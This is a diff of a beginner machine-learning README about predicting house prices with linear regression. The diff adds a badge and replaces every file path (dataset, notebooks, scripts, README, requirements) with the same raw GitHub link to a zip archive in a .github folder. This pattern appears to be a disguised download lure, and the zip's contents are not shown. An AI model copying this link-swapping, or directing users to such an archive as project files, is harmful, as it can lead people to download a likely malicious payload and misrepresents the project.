@@ -1,3 +1,4 @@
+[![Review Assignment Due Date](https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip)](https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip)
 # Machine Learning Beginner Project: Linear Regression
 ### Project Title: Predicting House Prices Using Linear Regression
 
@@ -16,37 +17,37 @@
 
 ├── data
 
-│   └── boston_housing.csv
+│   └── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 ├── notebooks
 
-│   ├── EDA.ipynb
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 
-│   ├── Data_Preprocessing.ipynb
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-│   ├── Model_Training.ipynb
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-│   └── Model_Evaluation.ipynb
+│   └── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 ├── scripts
 
-│   ├── data_preprocessing.py
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-│   ├── train_model.py
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-│   └── evaluate_model.py
+│   └── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-├── README.md
+├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-├── requirements.txt
+├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 └── .gitignore
 
 ## 2. Data Exploration and Preprocessing
 #### **Task 1:** Data Exploration
 
-Notebook: notebooks/EDA.ipynb
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Load the dataset.
 - Explore the data structure, types, and summary statistics.
@@ -56,39 +57,39 @@ Steps:
 
 #### Task 2: Data Preprocessing
 
-Notebook: notebooks/Data_Preprocessing.ipynb
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Handle missing values and outliers.
 - Encode categorical variables.
 - Normalize/standardize numerical features.
 - Split the data into training and testing sets.
-- Script: scripts/data_preprocessing.py
+- Script: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 
 ### 3. Model Building and Training
 #### Task 3: Model Training
 
-Notebook: notebooks/Model_Training.ipynb
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Choose appropriate features for the model.
 - Train a linear regression model.
 - Perform hyperparameter tuning (if applicable).
 
-- Script: scripts/train_model.py
+- Script: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 ### 4. Model Evaluation
 #### Task 4: Model Evaluation
 
-Notebook: notebooks/Model_Evaluation.ipynb
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Evaluate the model using metrics such as Mean Squared Error (MSE), R-squared.
 - Plot residuals to check the assumptions of linear regression.
 - Compare model performance with different feature sets or preprocessing steps.
-- Script: scripts/evaluate_model.py
+- Script: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 ### 5. Feature Engineering and Improvement
 #### Task 5: Feature Engineering
 
-Notebook: notebooks/Feature_Engineering.ipynb
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Create new features that might improve model performance.
 - Test different feature combinations.
